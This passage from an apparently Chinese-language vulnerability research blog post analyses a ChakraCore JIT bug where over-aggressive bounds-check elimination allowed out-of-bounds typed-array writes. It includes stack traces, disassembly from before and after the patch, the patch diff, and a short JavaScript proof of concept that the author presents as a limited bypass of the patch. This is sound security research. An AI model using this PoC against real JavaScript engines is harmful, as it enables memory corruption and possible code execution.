function=0x00000195982844e0, void *(*)(Js::RecyclableObject *, Js::CallInfo) entryPoint=0x00007ffa62c074a0, Js::Arguments args=&#123;...&#125;)</span><br><span class="line"> 23     ChakraCore.dll!Js::JavascriptFunction::CallRootFunctionInternal(Js::Arguments args=&#123;...&#125;, Js::ScriptContext * scriptContext=0x0000018d968dd620, bool inScript=true)</span><br><span class="line"> 24     ChakraCore.dll!Js::JavascriptFunction::CallRootFunction(Js::Arguments args=&#123;...&#125;, Js::ScriptContext * scriptContext=0x0000018d968dd620, bool inScript=true)</span><br><span class="line"> 25     ChakraCore.dll!RunScriptCore::__l2::&lt;lambda&gt;(Js::ScriptContext * scriptContext=0x0000018d968dd620, TTD::TTDJsRTActionResultAutoRecorder &amp; _actionEntryPopper=&#123;...&#125;)</span><br><span class="line"> 26     ChakraCore.dll!ContextAPIWrapper::__l2::&lt;lambda&gt;(Js::ScriptContext * scriptContext=0x0000018d968dd620)</span><br><span class="line"> 27     ChakraCore.dll!ContextAPIWrapper_Core&lt;0,_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *) &gt;(ContextAPIWrapper::__l2::_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *) fn=_JsErrorCode &lt;lambda&gt;(Js::ScriptContext * scriptContext)&#123;...&#125;)</span><br><span class="line"> 28     ChakraCore.dll!ContextAPIWrapper&lt;0,_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *, TTD::TTDJsRTActionResultAutoRecorder &amp;) &gt;(RunScriptCore::__l2::_JsErrorCode &lt;lambda&gt;(Js::ScriptContext *, TTD::TTDJsRTActionResultAutoRecorder &amp;) fn=_JsErrorCode &lt;lambda&gt;(Js::ScriptContext * scriptContext, TTD::TTDJsRTActionResultAutoRecorder &amp; _actionEntryPopper)&#123;...&#125;)</span><br><span class="line"> 29     ChakraCore.dll!RunScriptCore(void * scriptSource=0x00000195982bc000, const unsigned char * script=0x0000018d967278e0, unsigned __int64 cb=266, LoadScriptFlag loadScriptFlag=LoadScriptFlag_Utf8Source | LoadScriptFlag_ExternalArrayBuffer, unsigned __int64 sourceContext=0, const wchar_t * sourceUrl=0x0000018d9682c1c0, bool parseOnly=false, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, bool isSourceModule=false, void * * result=0x0000000000000000)</span><br><span class="line"> 30     ChakraCore.dll!CompileRun(void * scriptVal=0x00000195982bc000, unsigned __int64 sourceContext=0, void * sourceUrl=0x000001959827d020, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, void * * result=0x0000000000000000, bool parseOnly=false)</span><br><span class="line"> 31     ChakraCore.dll!JsRun(void * scriptVal=0x00000195982bc000, unsigned __int64 sourceContext=0, void * sourceUrl=0x000001959827d020, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, void * * result=0x0000000000000000)</span><br><span class="line"> 32     ch.exe!ChakraRTInterface::JsRun(void * script=0x00000195982bc000, unsigned __int64 sourceContext=0, void * sourceUrl=0x000001959827d020, _JsParseScriptAttributes parseAttributes=JsParseScriptAttributeNone, void * * result=0x0000000000000000)</span><br><span class="line"> 33     ch.exe!RunScript(const char * fileName=0x0000018d9673df50, const char * fileContents=0x0000018d967278e0, void * bufferValue=0x0000000000000000, char * fullPath=0x0000002e3a7ffa70)</span><br><span class="line"> 34     ch.exe!ExecuteTest(const char * fileName=0x0000018d9673df50)</span><br><span class="line"> 35     ch.exe!ExecuteTestWithMemoryCheck(char * fileName=0x0000018d9673df50)</span><br><span class="line"> 36     ch.exe!StaticThreadProc(void * lpParam=0x0000002e3a17fba8)</span><br><span class="line"> 37     ch.exe!invoke_thread_procedure(unsigned int(*)(void *) procedure=0x00007ff7d84647d0, void * const context=0x0000002e3a17fba8)</span><br><span class="line"> 38     ch.exe!thread_start&lt;unsigned int (__cdecl*)(void * __ptr64)&gt;(void * const parameter=0x0000018d9673ea70)</span><br><span class="line"> 39     [外部代码]</span><br></pre></td></tr></table></figure></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="JIT"><a href="#JIT" class="headerlink" title="JIT"></a>JIT</h4><p><img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-072024.jpg" alt=""><br>关于JIT生成不是重点，于是我调试了一下并没有详细写出调用，只是说一下。<br>在循环的解释执行次数超出loopInterpretCount的值的时候，就会进入JIT代码生成，然后在JIT代码生成后就转到JIT中执行，不再解释执行。</p><p>在JIT优化之后，DoLoopBodyStart调用CallLoopBody，参数是循环体JIT代码的地址。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-071023.jpg" alt=""><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fn-&gt;GetIsAsmJsFunction())</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="function">AutoRestoreLoopNumbers <span class="title">autoRestore</span><span class="params">(<span class="keyword">this</span>, loopNumber, doProfileLoopCheck)</span></span>;</span><br><span class="line">                newOffset = <span class="keyword">this</span>-&gt;CallAsmJsLoopBody(entryPointInfo-&gt;jsMethod);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                AutoRestoreLoopNumbers autoRestore(<span class="keyword">this</span>, loopNumber, doProfileLoopCheck);</span><br><span class="line">                newOffset = <span class="keyword">this</span>-&gt;CallLoopBody(entryPointInfo-&gt;jsMethod);</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p><p>漏洞触发在循环体中</p><h4 id="分析patch前汇编"><a href="#分析patch前汇编" class="headerlink" title="分析patch前汇编"></a>分析patch前汇编</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0000018D96940138  mov         dword ptr [rdi+9397Ch],ecx  </span><br><span class="line">0000018D9694013E  inc         ecx  </span><br><span class="line">0000018D96940140  cmp         r9d,r10d ----&gt;检查begin是否小于end</span><br><span class="line">0000018D96940143  jge         0000018D96940181  </span><br><span class="line">0000018D96940145  mov         r11,r14  </span><br><span class="line">0000018D96940148  mov         r13,r11  </span><br><span class="line">0000018D9694014B  shr         r13,30h  </span><br><span class="line">0000018D9694014F  cmp         r13,1  </span><br><span class="line">0000018D96940153  jne         0000018D9694032F  </span><br><span class="line">0000018D96940159  mov         r13d,r11d  </span><br><span class="line">0000018D9694015C  mov         dword ptr [rsi+r9*4],r13d ----&gt;对数组元素赋值</span><br></pre></td></tr></table></figure><p><code>mov         dword ptr [rsi+r9*4],r13d</code>是对view数组元素赋值，rsi是buffer的首地址,r9是数组索引值i,r13d即1851880825(hex:0x6E617579)是要赋的值</p><p> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-071054.jpg" alt=""><br>由汇编可以看出，缺少对索引值的边界检查（或者说优化后只剩下了检查begin是否小于end，但是没有检查索引上界end是否超出数组内存边界）<br>于是就访问到了不能访问的地址,crash。</p><h3 id="patch分析"><a href="#patch分析" class="headerlink" title="patch分析"></a>patch分析</h3><ul><li>patch<br><a href="https://github.com/Microsoft/ChakraCore/commit/a1345ad48064921e8eb45fa0297ce405a7df14d3" target="_blank" rel="noopener">https://github.com/Microsoft/ChakraCore/commit/a1345ad48064921e8eb45fa0297ce405a7df14d3</a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Too aggressive bound check removal</span><br><span class="line">Don&apos;t eliminate bounds checks on virtual typed arrays if we can&apos;t guarantee that the accesses will be within 4Gb</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">-            eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">-            eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">-            canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">+            <span class="comment">// Unless we're in asm.js (where it is guaranteed that virtual typed array accesses cannot read/write beyond 4GB),</span></span><br><span class="line">+            <span class="comment">// check the range of the index to make sure we won't access beyond the reserved memory beforing eliminating bounds</span></span><br><span class="line">+            <span class="comment">// checks in jitted code.</span></span><br><span class="line">+            <span class="keyword">if</span> (!GetIsAsmJSFunc())</span><br><span class="line">+            &#123;</span><br><span class="line">+                IR::RegOpnd * idxOpnd = baseOwnerIndir-&gt;GetIndexOpnd();</span><br><span class="line">+                <span class="keyword">if</span> (idxOpnd)</span><br><span class="line">+                &#123;</span><br><span class="line">+                    StackSym * idxSym = idxOpnd-&gt;m_sym-&gt;IsTypeSpec() ? idxOpnd-&gt;m_sym-&gt;GetVarEquivSym(<span class="literal">nullptr</span>) : idxOpnd-&gt;m_sym;</span><br><span class="line">+                    Value * idxValue = FindValue(idxSym);</span><br><span class="line">+                    IntConstantBounds idxConstantBounds;</span><br><span class="line">+                    <span class="keyword">if</span> (idxValue &amp;&amp; idxValue-&gt;GetValueInfo()-&gt;TryGetIntConstantBounds(&amp;idxConstantBounds))</span><br><span class="line">+                    &#123;</span><br><span class="line">+                        BYTE indirScale = Lowerer::GetArrayIndirScale(baseValueType);</span><br><span class="line">+                        int32 upperBound = idxConstantBounds.UpperBound();</span><br><span class="line">+                        int32 lowerBound = idxConstantBounds.LowerBound();</span><br><span class="line">+                        <span class="keyword">if</span> (lowerBound &gt;= <span class="number">0</span> &amp;&amp; ((<span class="keyword">static_cast</span>&lt;uint64&gt;(upperBound) &lt;&lt; indirScale) &lt; MAX_ASMJS_ARRAYBUFFER_LENGTH))</span><br><span class="line">+                        &#123;</span><br><span class="line">+                            eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                            eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                            canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">+                        &#125;</span><br><span class="line">+                    &#125;</span><br><span class="line">+                &#125;</span><br><span class="line">+            &#125;</span><br><span class="line">+            <span class="keyword">else</span></span><br><span class="line">+            &#123;</span><br><span class="line">+                eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">+            &#125;</span><br></pre></td></tr></table></figure><p>要分析patch，可以先看一下patch后现在的JIT代码是什么样，跟进JIT。<br>在这下个断点，跟到JIT里<br> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-071206.jpg" alt=""><br>再在JIT里下断点<br> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-071218.jpg" alt=""><br>继续执行到断点，并单步跟进<br> <img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-071241.jpg" alt=""></p><h4 id="分析patch后汇编"><a href="#分析patch后汇编" class="headerlink" title="分析patch后汇编"></a>分析patch后汇编</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">000001E8AB960000  mov         rax,1DFAB6B0A78h  </span><br><span class="line">000001E8AB96000A  mov         rax,qword ptr [rax]  </span><br><span class="line">000001E8AB96000D  add         rax,1C20h  </span><br><span class="line">000001E8AB960014  jo          000001E8AB960376  </span><br><span class="line">000001E8AB96001A  cmp         rsp,rax  </span><br><span class="line">000001E8AB96001D  jle         000001E8AB960376  </span><br><span class="line">000001E8AB960023  nop         dword ptr [rax]  </span><br><span class="line">000001E8AB960027  nop         dword ptr [rax]  </span><br><span class="line">000001E8AB96002B  mov         qword ptr [rsp+20h],r9  </span><br><span class="line">000001E8AB960030  mov         qword ptr [rsp+18h],r8  </span><br><span class="line">000001E8AB960035  mov         qword ptr [rsp+10h],rdx  </span><br><span class="line">000001E8AB96003A  mov         qword ptr [rsp+8],rcx  </span><br><span class="line">000001E8AB96003F  push        rbp  </span><br><span class="line">000001E8AB960041  mov         rbp,rsp  </span><br><span class="line">000001E8AB960044  sub         rsp,30h  </span><br><span class="line">000001E8AB960048  push        r15  </span><br><span class="line">000001E8AB96004A  push        r14  </span><br><span class="line">000001E8AB96004C  push        r13  </span><br><span class="line">000001E8AB96004E  push        r12  </span><br><span class="line">000001E8AB960050  push        rdi  </span><br><span class="line">000001E8AB960052  push        rsi  </span><br><span class="line">000001E8AB960054  push        rbx  </span><br><span class="line">000001E8AB960056  sub         rsp,28h  </span><br><span class="line">000001E8AB96005A  mov         rbx,1DFAB6701C0h  </span><br><span class="line">000001E8AB960064  mov         rsi,7FFA484B2198h  </span><br><span class="line">000001E8AB96006E  mov         rdi,1E7AB7C47C4h  </span><br><span class="line">000001E8AB960078  mov         r12,qword ptr [rbp+20h]  </span><br><span class="line">000001E8AB96007C  mov         r13,qword ptr [r12+160h]  </span><br><span class="line">000001E8AB960084  mov         r14,qword ptr [r12+168h]  </span><br><span class="line">000001E8AB96008C  mov         r15,qword ptr [r12+158h]  </span><br><span class="line">000001E8AB960094  mov         rax,qword ptr [r12+170h]  </span><br><span class="line">000001E8AB96009C  xor         ecx,ecx  </span><br><span class="line">000001E8AB96009E  mov         byte ptr [rbx+41D18h],1  </span><br><span class="line">000001E8AB9600A5  mov         byte ptr [rbx+41BBAh],3  </span><br><span class="line">000001E8AB9600AC  mov         rdx,qword ptr [rdi+1784Ch]  </span><br><span class="line">000001E8AB9600B3  mov         rdx,qword ptr [rdx+38h]  </span><br><span class="line">000001E8AB9600B7  mov         byte ptr [rbx+41BBAh],0  </span><br><span class="line">000001E8AB9600BE  cmp         byte ptr [rbx+41D18h],1  </span><br><span class="line">000001E8AB9600C5  jne         000001E8AB9601CE  </span><br><span class="line">000001E8AB9600CB  mov         r8,r13  </span><br><span class="line">000001E8AB9600CE  mov         r9,r8  </span><br><span class="line">000001E8AB9600D1  shr         r9,30h  </span><br><span class="line">000001E8AB9600D5  cmp         r9,1  </span><br><span class="line">000001E8AB9600D9  jne         000001E8AB9601E4  </span><br><span class="line">000001E8AB9600DF  mov         r8d,r8d  </span><br><span class="line">000001E8AB9600E2  mov         r9,rax  </span><br><span class="line">000001E8AB9600E5  mov         r10,r9  </span><br><span class="line">000001E8AB9600E8  shr         r10,30h  </span><br><span class="line">000001E8AB9600EC  cmp         r10,1  </span><br><span class="line">000001E8AB9600F0  jne         000001E8AB960231  </span><br><span class="line">000001E8AB9600F6  mov         r9d,r9d  </span><br><span class="line">000001E8AB9600F9  mov         r10,r15  </span><br><span class="line">000001E8AB9600FC  mov         r11,r10  </span><br><span class="line">000001E8AB9600FF  shr         r11,30h  </span><br><span class="line">000001E8AB960103  cmp         r11,1  </span><br><span class="line">000001E8AB960107  jne         000001E8AB96028A  </span><br><span class="line">000001E8AB96010D  mov         r10d,r10d  </span><br><span class="line">000001E8AB960110  mov         r11,rdx  </span><br><span class="line">000001E8AB960113  shr         r11,30h  </span><br><span class="line">000001E8AB960117  jne         000001E8AB9602E4  </span><br><span class="line">000001E8AB96011D  cmp         qword ptr [rdx],rsi  </span><br><span class="line">000001E8AB960120  jne         000001E8AB9602E4  </span><br><span class="line">000001E8AB960126  mov         esi,dword ptr [rdx+20h]  </span><br><span class="line">000001E8AB960129  cmp         r10d,esi  ----&gt;比较索引上界是否超出数组内存边界（检查上界）</span><br></pre></td></tr></table></figure><ul><li>比较索引上界是否超出数组长度（检查上界）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-071601.jpg" alt=""></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">000001E8AB96012C  jg          000001E8AB9602F7  </span><br><span class="line">000001E8AB960132  mov         rbx,qword ptr [rdx+38h]  </span><br><span class="line">000001E8AB960136  mov         rsi,1DFAB6B0A78h  </span><br><span class="line">000001E8AB960140  cmp         rsp,qword ptr [rsi]  </span><br><span class="line">000001E8AB960143  jle         000001E8AB96032A  </span><br><span class="line">000001E8AB960149  mov         dword ptr [rdi+9397Ch],ecx  </span><br><span class="line">000001E8AB96014F  inc         ecx  </span><br><span class="line">000001E8AB960151  cmp         r9d,r10d  -----&gt;比较索引值是否到达索引上界</span><br></pre></td></tr></table></figure><ul><li><p>比较索引值是否到达索引上界<br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-071716.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">000001E8AB960154  jge         000001E8AB96019A  </span><br><span class="line">000001E8AB960156  test        r9d,r9d  </span><br><span class="line">000001E8AB960159  js          000001E8AB96033C  </span><br><span class="line">000001E8AB96015F  mov         rsi,r14  </span><br><span class="line">000001E8AB960162  mov         r11,rsi  </span><br><span class="line">000001E8AB960165  shr         r11,30h  </span><br><span class="line">000001E8AB960169  cmp         r11,1  </span><br><span class="line">000001E8AB96016D  jne         000001E8AB960358  </span><br><span class="line">000001E8AB960173  mov         esi,esi  </span><br><span class="line">000001E8AB960175  mov         dword ptr [rbx+r9*4],esi  -----&gt;数组赋值</span><br></pre></td></tr></table></figure></li><li><p>数组赋值<br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-04-071642.jpg" alt=""></p></li></ul><h4 id="关于patch的思考"><a href="#关于patch的思考" class="headerlink" title="关于patch的思考"></a>关于patch的思考</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+                        <span class="keyword">if</span> (lowerBound &gt;= <span class="number">0</span> &amp;&amp; ((<span class="keyword">static_cast</span>&lt;uint64&gt;(upperBound) &lt;&lt; indirScale) &lt; MAX_ASMJS_ARRAYBUFFER_LENGTH))</span><br><span class="line">+                        &#123;</span><br><span class="line">+                            eliminatedLowerBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                            eliminatedUpperBoundCheck = <span class="literal">true</span>;</span><br><span class="line">+                            canBailOutOnArrayAccessHelperCall = <span class="literal">false</span>;</span><br><span class="line">+                        &#125;</span><br></pre></td></tr></table></figure><p>要绕过patch再次触发就要进入这个if body，(static_cast<uint64>(upperBound) &lt;&lt; indirScale)的限制是要小于4GB，这应该和内存分配有关。<br><code>var buffer = new ArrayBuffer(0x10000);</code><br>能否在进入if body的同时，又能OOB超出数组长度，就是后面需要思考的问题。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">IntConstantBounds idxConstantBounds;</span><br><span class="line">                    <span class="keyword">if</span> (idxValue &amp;&amp; idxValue-&gt;GetValueInfo()-&gt;TryGetIntConstantBounds(&amp;idxConstantBounds))</span><br><span class="line">                    &#123;</span><br><span class="line">                        BYTE indirScale = Lowerer::GetArrayIndirScale(baseValueType);</span><br><span class="line">                        int32 upperBound = idxConstantBounds.UpperBound();</span><br><span class="line">                        int32 upperBound = idxConstantBounds.LowerBound();</span><br></pre></td></tr></table></figure></uint64></p><p>该段代码表示了程序试图获取ConstantBounds来赋值给idxConstantBounds从而控制upperBound&amp;lowerBound<br>因此PoC中需要构造常数边界来控制upperBound&amp;upperBound从而控制下列判断：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (lowerBound &gt;= <span class="number">0</span> &amp;&amp; ((<span class="keyword">static_cast</span>&lt;uint64&gt;(upperBound) &lt;&lt; indirScale) &lt; MAX_ASMJS_ARRAYBUFFER_LENGTH))</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//回溯分析</span><br><span class="line">//rax = idxOpnd</span><br><span class="line">//if (idxOpnd) </span><br><span class="line">//idxSym = idxOpnd-&gt;m_sym;</span><br><span class="line">        //&#123;</span><br><span class="line">                    //test rax,rax</span><br><span class="line">                    //...</span><br><span class="line">                    //mov         rax,qword ptr [rax+8]</span><br><span class="line">                    //...</span><br><span class="line">                    //mov         rcx,rax</span><br><span class="line">                    //...</span><br><span class="line">                    //StackSym::GetTypeEquivSym(IRType type, Func *func)</span><br><span class="line">                    //...</span><br><span class="line">                    //mov         rax,qword ptr [rcx+30h]</span><br><span class="line">        //&#125;</span><br><span class="line">//Value * idxValue = FindValue(idxSym); //rax</span><br><span class="line">//IntConstantBounds idxConstantBounds; //rax</span><br><span class="line">//if (idxValue &amp;&amp; idxValue-&gt;GetValueInfo()-&gt;TryGetIntConstantBounds(&amp;idxConstantBounds)) //rax</span><br></pre></td></tr></table></figure><p>经过测试，在patch了的函数那里下断，跟进到这个if判断,得到有限制的bypass patch PoC<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">j,number</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10000</span>;i++) <span class="comment">//create jit code</span></span><br><span class="line"> &#123;</span><br><span class="line">    <span class="keyword">if</span>(j&gt;=<span class="number">0</span> &amp;&amp; j&lt;=<span class="number">0x6000000</span>) view[j]=number;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10000</span>);</span><br><span class="line"><span class="keyword">var</span> view = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span><br><span class="line"></span><br><span class="line">write(<span class="number">0x1234</span>,<span class="number">1</span>) <span class="comment">//jit create</span></span><br><span class="line">write(<span class="number">0x123456</span>,<span class="number">1</span>) <span class="comment">//bypass(limited) patch</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//mov     r8,qword ptr [rbp-78h]= 0600000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//R8  = 06000000 00000000</span></span><br><span class="line"><span class="comment">//       high      low</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//test        r8d,r8d   r8d=0</span></span><br><span class="line"><span class="comment">//shr         r8,20h    r8=0x0000000006000000</span></span><br><span class="line"><span class="comment">//movsxd      rdx,r8d   rdx=0x06000000</span></span><br><span class="line"><span class="comment">//movzx       ecx,al    al=2</span></span><br><span class="line"><span class="comment">//shl         rdx,cl </span></span><br><span class="line"><span class="comment">//mov         rax,100000000h </span></span><br><span class="line"><span class="comment">//cmp         rdx,rax</span></span><br></pre></td></tr></table></figure></p><h3 id="更多的思考"><a href="#更多的思考" class="headerlink" title="更多的思考"></a>更多的思考</h3><p><del>chakra为什么这么优化，它涉及怎样的一个pattern，这样优化和buffer相关的点有哪些？</del></p><ol><li>为什么JIT优化去掉边界？它为什么会去掉边界？（和4GB有关，这种特殊的buffer分配方式）</li><li>PoC能否修改？怎么修改？思考如下：</li></ol><ul><li>不同的对象能否触发？举例：一定要是Uint32Array或者ArrayBuffer么?</li><li>是否一定用到循环？去掉循环行不行？怎么精简PoC?</li></ul><h3 id="JIT优化-amp-amp-内存分配"><a href="#JIT优化-amp-amp-内存分配" class="headerlink" title="JIT优化&amp;&amp;内存分配"></a>JIT优化&amp;&amp;内存分配</h3><p>经过进一步对内存分配的调试（首先我在windbg里对windows API下断,参考了<a href="https://labs.portcullis.co.uk/blog/cve-2015-5119-flash-bytearray-uaf-a-beginners-walkthrough/" target="_blank" rel="noopener">这篇</a>，然后回溯确实跟到了VirtualAlloc，不过和我找的不是同一个。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-07-08-031720.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; bp KERNEL32!VirtualAllocStub</span><br><span class="line">0:000&gt; g</span><br><span class="line">ModLoad: 00007ffc`0e250000 00007ffc`0fc52000   D:\chakracore\ChakraCore\Build\VcBuild\bin\x64_debug\chakracore.dll</span><br><span class="line">ModLoad: 00007ffc`55f90000 00007ffc`560d5000   C:\windows\System32\ole32.dll</span><br><span class="line">ModLoad: 00007ffc`54030000 00007ffc`54057000   C:\windows\System32\GDI32.dll</span><br><span class="line">ModLoad: 00007ffc`529c0000 00007ffc`52b47000   C:\windows\System32\gdi32full.dll</span><br><span class="line">ModLoad: 00007ffc`53780000 00007ffc`538ca000   C:\windows\System32\USER32.dll</span><br><span class="line">ModLoad: 00007ffc`529a0000 00007ffc`529be000   C:\windows\System32\win32u.dll</span><br><span class="line">ModLoad: 00007ffc`53f10000 00007ffc`53f69000   